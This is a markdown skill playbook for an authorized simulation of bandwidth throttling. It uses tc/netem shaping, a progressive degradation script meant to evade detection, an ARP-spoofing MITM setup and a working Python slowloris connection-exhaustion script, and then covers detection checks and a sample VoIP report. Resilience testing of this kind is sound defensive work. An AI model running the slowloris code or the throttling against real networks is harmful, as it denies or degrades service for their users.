---
name: performing-bandwidth-throttling-attack-simulation
description: >
  Simulates bandwidth throttling and network degradation attacks using tc, iperf3, and
  Scapy in authorized environments to test quality-of-service controls, application
  resilience, and network monitoring detection of traffic manipulation attacks.
domain: cybersecurity
subdomain: network-security
tags: [network-security, bandwidth-throttling, qos, traffic-shaping, network-resilience]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Performing Bandwidth Throttling Attack Simulation

## When to Use

- Testing application resilience to degraded network conditions during authorized security assessments
- Validating QoS policies detect and mitigate unauthorized traffic shaping on the network
- Simulating network slowloris-style attacks that degrade bandwidth rather than causing complete outages
- Assessing the impact of bandwidth-based attacks on VoIP, video conferencing, and real-time applications
- Testing network monitoring tools' ability to detect abnormal bandwidth utilization patterns

**Do not use** on production networks without authorization and a maintenance window, for causing denial-of-service conditions, or against critical infrastructure without safety controls.

## Prerequisites

- Written authorization for bandwidth manipulation testing
- Linux system with tc (traffic control), netem, and iptables
- iperf3 installed on both tester and target systems for bandwidth measurement
- MITM position established (ARP spoofing) for traffic interception scenarios
- Network monitoring tools deployed for detecting the simulation
- Baseline bandwidth measurements before testing

## Workflow

### Step 1: Establish Baseline Bandwidth Measurements

```bash
# Start iperf3 server on the target
iperf3 -s -p 5201

# Measure baseline bandwidth from the tester
iperf3 -c 10.10.20.10 -t 30 -P 4 -p 5201
# Record: bandwidth, jitter, packet loss

# Measure baseline latency
ping -c 100 10.10.20.10 | tail -1
# Record: min/avg/max/mdev

# Measure baseline jitter with UDP test
iperf3 -c 10.10.20.10 -u -b 100M -t 10 -p 5201
# Record: jitter and packet loss percentage

# Document baseline values
echo "Baseline: BW=$(iperf3 -c 10.10.20.10 -t 10 -f m | tail -1 | awk '{print $7}') Mbps" > baseline.txt
echo "Latency: $(ping -c 50 10.10.20.10 | tail -1)" >> baseline.txt
```

### Step 2: Simulate Bandwidth Throttling with tc/netem

```bash
# Add traffic control to limit bandwidth on the attacker's forwarding interface
# This simulates throttling traffic flowing through a compromised router

# Limit to 1 Mbps (severe throttling)
sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 50ms

# Or use hierarchical token bucket for more control
sudo tc qdisc add dev eth0 root handle 1: htb default 10
sudo tc class add dev eth0 parent 1: classid 1:10 htb rate 1mbit ceil 2mbit

# Add latency and packet loss to simulate degraded link
sudo tc qdisc add dev eth0 parent 1:10 handle 10: netem delay 200ms 50ms loss 5%

# Target specific traffic (only throttle traffic to specific host)
sudo tc qdisc add dev eth0 root handle 1: htb default 99
sudo tc class add dev eth0 parent 1: classid 1:1 htb rate 1000mbit
sudo tc class add dev eth0 parent 1:1 classid 1:10 htb rate 1mbit ceil 2mbit
sudo tc class add dev eth0 parent 1:1 classid 1:99 htb rate 1000mbit

# Filter: throttle only traffic to 10.10.20.10
sudo tc filter add dev eth0 parent 1: protocol ip prio 1 u32 \
  match ip dst 10.10.20.10/32 flowid 1:10

# Verify the qdisc configuration
tc -s qdisc show dev eth0
tc -s class show dev eth0
```

### Step 3: Simulate Progressive Degradation

```bash
#!/bin/bash
# Simulate progressive bandwidth degradation over time
# This mimics an attacker slowly throttling to avoid detection

IFACE="eth0"
TARGET="10.10.20.10"

# Phase 1: Baseline (no throttling) - 5 minutes
echo "[*] Phase 1: Baseline (no throttling)"
sleep 300

# Phase 2: Mild throttling (50% reduction)
echo "[*] Phase 2: Reducing to 50 Mbps"
sudo tc qdisc add dev $IFACE root tbf rate 50mbit burst 64kbit latency 50ms
sleep 300

# Phase 3: Moderate throttling (80% reduction)
echo "[*] Phase 3: Reducing to 10 Mbps"
sudo tc qdisc change dev $IFACE root tbf rate 10mbit burst 32kbit latency 50ms
sleep 300

# Phase 4: Severe throttling + latency + loss
echo "[*] Phase 4: Reducing to 1 Mbps + 200ms latency + 5% loss"
sudo tc qdisc del dev $IFACE root 2>/dev/null
sudo tc qdisc add dev $IFACE root handle 1: htb default 10
sudo tc class add dev $IFACE parent 1: classid 1:10 htb rate 1mbit ceil 2mbit
sudo tc qdisc add dev $IFACE parent 1:10 handle 10: netem delay 200ms 50ms loss 5%
sleep 300

# Phase 5: Recovery
echo "[*] Phase 5: Removing all throttling"
sudo tc qdisc del dev $IFACE root 2>/dev/null
echo "[*] Simulation complete"
```

### Step 4: Simulate Slowloris-Style Connection Exhaustion

```python
#!/usr/bin/env python3
"""Slowloris-style connection simulation for authorized bandwidth testing."""

import socket
import time
import threading

TARGET = "10.10.20.10"
PORT = 80
NUM_CONNECTIONS = 200

sockets = []

def create_slow_connection():
    """Create a connection that sends data very slowly."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET, PORT))
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(f"Host: {TARGET}\r\n".encode())
        sockets.append(s)
        return s
    except Exception:
        return None

def keep_alive():
    """Send partial headers to keep connections open."""
    while True:
        for s in list(sockets):
            try:
                s.send(b"X-Padding: " + b"A" * 10 + b"\r\n")
            except Exception:
                sockets.remove(s)
        time.sleep(15)

print(f"[*] Opening {NUM_CONNECTIONS} slow connections to {TARGET}:{PORT}")
for i in range(NUM_CONNECTIONS):
    s = create_slow_connection()
    if s:
        if (i + 1) % 50 == 0:
            print(f"[*] {i + 1} connections established")
    time.sleep(0.1)

print(f"[*] {len(sockets)} connections open. Sending keep-alive headers...")
print("[*] Press Ctrl+C to stop")

try:
    keep_alive()
except KeyboardInterrupt:
    print(f"\n[*] Closing {len(sockets)} connections")
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    print("[*] Cleanup complete")
```

### Step 5: Measure Impact and Detect Anomalies

```bash
# Re-measure bandwidth during throttling
iperf3 -c 10.10.20.10 -t 10 -f m -p 5201
# Compare with baseline values

# Measure latency degradation
ping -c 50 10.10.20.10

# Check network monitoring for detection
# Verify that monitoring tools detected the bandwidth change

# Check SNMP-based monitoring (Cacti, LibreNMS, Zabbix)
# Interface utilization should show abnormal patterns

# Check Zeek logs for connection anomalies
cat /opt/zeek/logs/current/conn.log | \
  zeek-cut ts id.orig_h id.resp_h duration orig_bytes resp_bytes | \
  awk '$4 > 0 && ($5/$4 < 1000 || $6/$4 < 1000)' | head -20
# Low bytes/second ratio indicates throttling

# Check for QoS alerts in network management tools
# NetFlow analysis: look for changes in traffic patterns
# nfdump -r /var/cache/nfdump/nfcapd.* -s srcip/bytes -n 20
```

### Step 6: Clean Up and Document

```bash
# Remove all traffic control rules
sudo tc qdisc del dev eth0 root 2>/dev/null

# Verify cleanup
tc qdisc show dev eth0
# Should show: qdisc noqueue or default qdisc only

# Stop ARP spoofing if used
sudo killall arpspoof bettercap 2>/dev/null
sudo sysctl -w net.ipv4.ip_forward=0

# Final bandwidth measurement to confirm restoration
iperf3 -c 10.10.20.10 -t 10 -f m -p 5201
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Traffic Shaping** | Deliberate manipulation of network traffic flow rates using queuing disciplines to control bandwidth allocation |
| **tc (Traffic Control)** | Linux kernel subsystem for configuring packet scheduling, shaping, policing, and dropping using queuing disciplines (qdiscs) |
| **netem (Network Emulator)** | Linux tc qdisc that simulates network conditions including delay, jitter, packet loss, corruption, and reordering |
| **Token Bucket Filter (TBF)** | tc qdisc that limits traffic rate by allowing packets through only when tokens are available, enforcing a maximum bandwidth rate |
| **Slowloris** | Application-layer attack that exhausts server connection pools by opening many connections and sending data very slowly |
| **QoS (Quality of Service)** | Network mechanisms for prioritizing specific traffic types (VoIP, video) and ensuring minimum bandwidth guarantees |

## Tools & Systems

- **tc/netem**: Linux kernel traffic control and network emulation framework for simulating bandwidth limitations and network degradation
- **iperf3**: Network bandwidth measurement tool for establishing baselines and measuring the impact of throttling
- **Bettercap**: Network attack framework used for establishing MITM position to intercept and throttle traffic
- **Scapy**: Python packet manipulation for crafting custom traffic patterns and connection exhaustion simulations
- **NetFlow/sFlow**: Network flow monitoring protocols for detecting abnormal bandwidth utilization patterns

## Common Scenarios

### Scenario: Testing VoIP System Resilience to Bandwidth Degradation

**Context**: A company relies on SIP-based VoIP for business communications. The security team needs to assess how VoIP quality degrades under various network attack conditions and at what point calls become unusable. The testing is authorized on a dedicated VoIP test VLAN.

**Approach**:
1. Establish baseline call quality using iperf3 UDP tests measuring jitter (<30ms) and packet loss (<1%) on the VoIP VLAN
2. Set up MITM position between VoIP endpoints using ARP spoofing
3. Progressively introduce latency (50ms, 100ms, 200ms, 500ms) using netem and measure MOS (Mean Opinion Score) at each level
4. Introduce packet loss (1%, 3%, 5%, 10%) and measure call quality degradation
5. Throttle bandwidth from 1 Mbps to 100 Kbps to determine the minimum usable bandwidth for G.711 codec (requires 87.2 Kbps)
6. Verify that QoS policies on the network prioritize VoIP traffic and restore quality when throttling affects the shared link
7. Document the degradation thresholds and recommend minimum QoS guarantees for the VoIP VLAN

**Pitfalls**:
- Forgetting to remove tc rules after testing, leaving bandwidth limitations in place on the test network
- Testing at rates too low, causing complete call failure instead of measurable degradation
- Not accounting for VoIP codec differences -- G.711 requires more bandwidth than G.729
- Running the test on a shared VLAN and affecting non-test traffic

## Output Format

```
## Bandwidth Throttling Simulation Report

**Test ID**: BW-THROTTLE-2024-001
**Target Network**: VLAN 60 (VoIP Test)
**Test Duration**: 2024-03-15 14:00-16:00 UTC

### Baseline Measurements
| Metric | Value |
|--------|-------|
| Bandwidth (TCP) | 947 Mbps |
| Bandwidth (UDP) | 912 Mbps |
| Latency (avg) | 0.8 ms |
| Jitter | 0.2 ms |
| Packet Loss | 0.00% |

### Degradation Impact Matrix

| Condition | Bandwidth | Latency | Jitter | Loss | VoIP MOS |
|-----------|-----------|---------|--------|------|----------|
| Baseline | 947 Mbps | 0.8 ms | 0.2 ms | 0% | 4.4 |
| 50ms latency | 947 Mbps | 51 ms | 5 ms | 0% | 4.0 |
| 200ms latency | 947 Mbps | 201 ms | 25 ms | 0% | 3.2 |
| 5% loss | 947 Mbps | 0.8 ms | 0.2 ms | 5% | 2.8 |
| 1 Mbps cap | 1 Mbps | 45 ms | 12 ms | 2% | 3.0 |
| 100 Kbps cap | 100 Kbps | 380 ms | 95 ms | 15% | 1.2 |

### QoS Validation
- QoS detected throttling at 10 Mbps threshold: YES
- VoIP traffic prioritized during throttling: YES (maintained 3.8 MOS)
- Alert generated by monitoring: YES (bandwidth anomaly at 14:15 UTC)

### Recommendations
1. Ensure minimum 200 Kbps guaranteed bandwidth per VoIP call
2. Configure QoS to prioritize DSCP EF (46) marked traffic
3. Set monitoring threshold at 80% bandwidth utilization for early warning
```
